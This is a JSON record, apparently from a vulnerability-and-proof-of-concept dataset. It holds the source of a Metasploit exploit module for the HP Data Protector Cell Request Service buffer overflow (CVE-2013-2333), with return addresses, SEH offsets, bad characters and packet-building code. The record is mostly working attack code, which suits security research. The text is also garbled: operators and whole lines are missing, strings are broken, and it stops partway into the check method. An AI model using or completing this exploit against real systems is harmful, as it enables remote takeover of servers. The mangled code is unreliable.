{
    "text": "vul_name : HP Data Protector Cell Request Service Buffer Overflow ， vul_cve : CVE-2013-2333 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : Remote : Tcp ， include Msf : Exploit : Remote : Seh ， super ( update_info ( info ,  ， 'Name' => 'HP Data Protector Cell Request Service Buffer Overflow' ,  ， 'Description' => %q{ ， This module exploits a stack-based buffer overflow in the Hewlett-Packard Data Protector ， product. The vulnerability , due to the insecure usage of _swprintf , exists at the Cell ， Request Service ( crs.exe ) when parsing packets with opcode 211. This module has been tested ， successfully on HP Data Protector 6.20 and 7.00 on Windows XP SP3. ， } ,  ， 'Author' => ，  [  ， 'e6af8de8b1d4b2b6d5ba2610cbf9cd38' ,  # Vulnerability discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-2333' ]  ,  ，  [ 'OSVDB' , '93867' ]  ,  ，  [ 'BID' , '60309' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'Payload' => ， { ， 'Space' => 4096 ,  ， 'BadChars' => \"\\x00\\xff\\x20\" # \"\\x00\\x00\" , \"\\xff\\xff\" and \"\\x20\\x00\" not allowed ， } ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ,  ，  [ 'HP Data Protector 6.20 build 370 / Windows XP SP3' ,  ， { ， 'Ret' => 0x00436fe2 ,  # ppr from crs.exe ， 'Offset' => 15578 ， } ，  ]  ,  ，  [ 'HP Data Protector 7.00 build 72 / Windows XP SP3' ,  ， { ， 'Ret' => 0x004cf8c1 ,  # ppr from crs.exe ， 'Offset' => 15578 ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Jun 03 2013' )  ， deregister_options ( 'RPORT' )  # The CRS service runs on a random port ， end ， data = \"\\xff\\xfe\" # BOM Unicode ， fields.each do | k , v |  ， data \" # {v}\\x00\\x00\" ， data \" # {Rex : Text.to_unicode ( v ) }\\x00\\x00\" ， end ， data Rex : Text.to_unicode ( \" \" )  # Separator ， end ， data.chomp !  ( Rex : Text.to_unicode ( \" \" )  # Delete last separator ， data \"\\x00\\x00\" # Ending ， end ， def get_fingerprint ， ommni = connect ( false , {'RPORT' => 5555} )  ， ommni.put ( rand_text_alpha_upper ( 64 )  ， resp = ommni.get_once ( -1 )  ， disconnect ， end ， end ， def get_crs_port ， pkt = build_pkt ( { ， \"Opcode\" => \"2\" ,  ， \"FakeMachineName\" => rand_text_alpha ( 8 )  ,  ， \"Unknown1\" => \"0\" ,  ， \"FakeDomainUser\" => rand_text_alpha ( 8 )  ,  ， \"FakeDomain\" => rand_text_alpha ( 8 )  ,  ， \"FakeLanguage\" => rand_text_alpha ( 8 )  ,  ， \"Unknown2\" => \"15\" ， } )  ， ommni = connect ( false , {'RPORT' => 5555} )  ， ommni.put ( pkt )  ， resp = ommni.get_once ( -1 )  ， disconnect ， end ， res_length , bom_unicode , res_data = resp.unpack ( \"Nna * \" )  ， fields = res_data.split ( Rex : Text.to_unicode ( \" \" )  ， opcode = fields [ 0 ]  ， port = fields [ 1 ]  ， vprint_error ( \"Unexpected response\" )  ， end ， opcode = Rex : Text.to_ascii ( opcode.chomp ( \"\\x00\\x00\" )  ， vprint_error ( \"Unexpected opcode # {opcode} in the response\" )  ， end ， port = Rex : Text.to_ascii ( port.chomp ( \"\\x00\\x00\" )  ， end ， def check ， fingerprint = get_fingerprint",
    "time": "2013.10.15"
}